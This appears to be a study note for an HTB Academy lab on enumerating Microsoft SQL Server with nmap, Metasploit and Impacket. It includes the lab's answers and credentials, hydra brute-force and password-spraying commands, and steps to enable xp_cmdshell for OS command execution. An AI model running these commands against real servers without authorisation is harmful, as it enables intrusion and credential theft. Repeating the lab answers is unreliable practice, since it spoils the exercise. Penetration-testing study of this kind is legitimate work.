# 🛰️ MSSQL Server Enumeration and Security Assessment

## Initial Reconnaissance

### Basic Nmap Scan
```bash
sudo nmap -p1433 --open target
```

### Comprehensive Nmap Script Scan
```bash
sudo nmap --script ms-sql-info,ms-sql-ntlm-info -p1433 target
```

#### Example Output:
```
PORT    STATE SERVICE
1433/tcp open  mssql

# MS SQL Server 2019 details from the script output:
Microsoft SQL Server 2019 RTM (15.00.2000.00)
|_       TCP port: 1433
|       Named pipe: \\target\pipe\sql\query
|       Clustered: false
```

### Key Information Extracted:
- **Hostname**: SQL-01
- **Instance**: MSSQLSERVER
- **Version**: Microsoft SQL Server 2019 RTM (15.00.2000.00)
- **TCP Port**: 1433
- **Named Pipe**: \\target\pipe\sql\query

## Metasploit MSSQL Ping Scanner

### Use Metasploit Auxiliary Module
```bash
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts target
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

#### Example Output:
```text
[*] Scanned 1 of 1 hosts (100% complete)
[+] Target: SQL-01 - MSSQLSERVER
    ServerName: SQL-01
    InstanceName: MSSQLSERVER
    IsClustered: No
    Version: 15.0.2000.5
    TCP Port: 1433
    Named Pipe: \\SQL-01\pipe\sql\query
```

## Connecting with `mssqlclient.py`

### Windows Authentication
```bash
python3 mssqlclient.py Administrator@target -windows-auth
```

#### Example Connection Output:
```text
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
```

### Basic Database Enumeration
```bash
# List all databases
SQL> select name from sys.databases;

name                                                                                                                               
--------------------------------------------------------------------------------------
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
Transactions
```

### SQL Server Authentication
```bash
python3 mssqlclient.py sa@target

# Connect with specific credentials
python3 mssqlclient.py backdoor@target -windows-auth
```

## Advanced Enumeration

### Database Information Gathering
```sql
-- Get MSSQL version
SQL> SELECT @@version;

-- Get server information
SQL> SELECT @@servername;

-- List all databases
SQL> SELECT name, database_id FROM sys.databases;

-- Get user information
SQL> SELECT name FROM sys.server_principals WHERE type = 'S';

-- Get database permissions
SQL> SELECT * FROM sys.database_permissions;
```

### System Information
```sql
# Get system configuration
SQL> SELECT name, value FROM sys.configurations WHERE name = 'xp_cmdshell';

# Get linked servers
SQL> SELECT * FROM sys.servers;

# Get database files
SQL> SELECT name, physical_name FROM sys.master_files;
```

## HTB Academy Lab Questions

### Question 1: Hostname Detection
**Task**: Enumerate the target and list the hostname of MSSQL server.

**Solution**:
```bash
# Step 1: Comprehensive nmap scan
sudo nmap --script ms-sql-info,ms-sql-ntlm-info -p1433 target

# Step 2: Extract hostname from nmap output
# Look for:
# |   Target_Name: SQL-01
# |   Windows server name: SQL-01

# Answer: SQL-01
```

### Question 2: Non-Default Database Discovery
**Task**: Connect using account (backdoor:Password1) and list non-default database.

**Solution**:
```bash
# Step 1: Connect with provided credentials
python3 mssqlclient.py backdoor@target -windows-auth
# Password: Password1

# Step 2: List all databases
SQL> select name from sys.databases;

# Step 3: Identify non-default databases
# Default databases: master, tempdb, model, msdb, resource
# Non-default database: Look for custom database names

# Example result: "Employees" or "Transactions"
```

## Enumeration Techniques

### 1. Service Detection
```bash
# Basic MSSQL detection
nmap -p1433 -sV target

# Comprehensive enumeration
nmap -p1433 --script ms-sql-info,ms-sql-config,ms-sql-tables target
```

### 2. Authentication Testing
```bash
# Test Windows authentication
impacket-mssqlclient administrator@target -windows-auth

# Test SQL Server authentication
impacket-mssqlclient sa@target

# Test with specific credentials
impacket-mssqlclient backdoor@target -windows-auth
```

### 3. Database Analysis
```sql
# List databases
SELECT name FROM sys.databases;

# Use specific database
USE database_name;

# List tables
SELECT name FROM sys.tables;

# Query table data
SELECT * FROM table_name;
```

## Security Assessment

### Common Vulnerabilities
1. **Default Credentials**: SA account with weak passwords.
2. **Windows Authentication**: Compromised domain accounts.
3. **Missing Encryption**: Plaintext communication.
4. **Excessive Permissions**: Over-privileged database users.
5. **Outdated Software**: Unpatched MSSQL instances.

### Enumeration Checklist
- [ ] Port scan for 1433
- [ ] Service version detection
- [ ] Hostname extraction
- [ ] Authentication method testing
- [ ] Default credential testing
- [ ] Database enumeration
- [ ] System database analysis
- [ ] Custom database discovery
- [ ] User and permission assessment

## Attack Vectors

### 1. Credential-based Access
```bash
# Brute force SA account
hydra -l sa -P passwords.txt mssql://target

# Password spraying
crackmapexec mssql target -u users.txt -p passwords.txt
```

### 2. Command Execution
```sql
# Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

# Execute commands
SQL> EXEC xp_cmdshell 'whoami';
```

### 3. Data Extraction
```sql
# Extract sensitive data
SQL> SELECT * FROM sys.sql_logins;

# Access system databases
SQL> USE master;
SQL> SELECT * FROM sys.server_principals;
```

## Tools and Techniques

### Essential Tools
- [[Impacket mssqlclient]]
- [[Nmap scripts]]
- [[Metasploit modules]]

```bash
# Impacket mssqlclient
impacket-mssqlclient user@target -windows-auth

# Nmap scripts
nmap --script ms-sql-* target

# Metasploit modules
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
```

## Defensive Measures

### Security Best Practices
1. **Disable SA account**: Use Windows Authentication only.
2. **Enable encryption**: Force SSL/TLS connections.
3. **Least privilege**: Restrict database permissions.
4. **Regular updates**: Apply security patches.
5. **Monitor access**: Enable audit logging.
6. **Network security**: Firewall restrictions.

---